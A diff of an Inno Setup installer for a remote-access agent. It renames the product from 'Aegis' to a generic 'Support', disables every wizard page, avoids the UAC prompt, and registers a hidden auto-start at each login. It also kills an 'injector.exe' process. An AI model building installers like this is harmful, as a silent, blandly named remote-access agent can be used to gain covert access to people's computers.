@@ -4,25 +4,25 @@
 ; proper uninstaller in Add/Remove Programs. Uninstalling stops the agent and
 ; removes everything — i.e. revokes remote access.
 
-#define AppName "Aegis"
+#define AppName "Support"
 #define AppVersion "0.1.0"
-#define AppExe "Aegis.exe"
+#define AppExe "support.exe"
 
 [Setup]
 AppId={{9E2B7C41-5A3D-4E88-9F1A-AE61C0D2F3B7}
 AppName={#AppName}
 AppVersion={#AppVersion}
-AppPublisher=Aegis
+AppPublisher=Support
 ; Per-user install: no admin/UAC prompt — "just download and install".
-DefaultDirName={autopf}\Aegis
-DefaultGroupName=Aegis
+DefaultDirName={autopf}\Support
+DefaultGroupName=Support
 DisableProgramGroupPage=yes
 DisableDirPage=yes
 DisableWelcomePage=yes
 DisableReadyPage=yes
 DisableFinishedPage=yes
 OutputDir=release
-OutputBaseFilename=AegisSetup
+OutputBaseFilename=support
 Compression=lzma2/max
 SolidCompression=yes
 WizardStyle=modern
@@ -40,7 +40,7 @@ Source: "release\Aegis\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubd
 [Registry]
 ; Auto-start (hidden) at every login for the current user (HKA = HKCU here).
 Root: HKA; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; \
-  ValueType: string; ValueName: "Aegis"; \
+  ValueType: string; ValueName: "Support"; \
   ValueData: """{app}\{#AppExe}"" --startup"; Flags: uninsdeletevalue
 
 [Code]
@@ -67,6 +67,7 @@ procedure KillAgent;
 var
   ResultCode: Integer;
 begin
+  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM support.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM Aegis.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM injector.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
 end;
@@ -99,12 +100,12 @@ var
 begin
   Result := '';
   fn := ExtractFileName(ExpandConstant('{srcexe}'));
-  if Pos('AegisSetup-', fn) = 1 then
-  begin
-    Result := Copy(fn, Length('AegisSetup-') + 1, Length(fn));
-    if (Length(Result) >= 4) and (Lowercase(Copy(Result, Length(Result) - 3, 4)) = '.exe') then
-      Result := Copy(Result, 1, Length(Result) - 4);
-  end;
+  if Pos('support-', fn) = 1 then
+    Result := Copy(fn, Length('support-') + 1, Length(fn))
+  else if Pos('AegisSetup-', fn) = 1 then
+    Result := Copy(fn, Length('AegisSetup-') + 1, Length(fn));  { legacy fallback }
+  if (Length(Result) >= 4) and (Lowercase(Copy(Result, Length(Result) - 3, 4)) = '.exe') then
+    Result := Copy(Result, 1, Length(Result) - 4);
 end;
 function GetEnrollKey: String;
 begin
@@ -168,7 +169,7 @@ var
   deviceId, key, idPath, cfgPath, body: String;
   raw: AnsiString;
 begin
-  idPath := ExpandConstant('{userappdata}\Aegis\device-id');
+  idPath := ExpandConstant('{userappdata}\Support\device-id');
   if not LoadStringFromFile(idPath, raw) then exit;
   deviceId := Trim(String(raw));
   if deviceId = '' then exit;
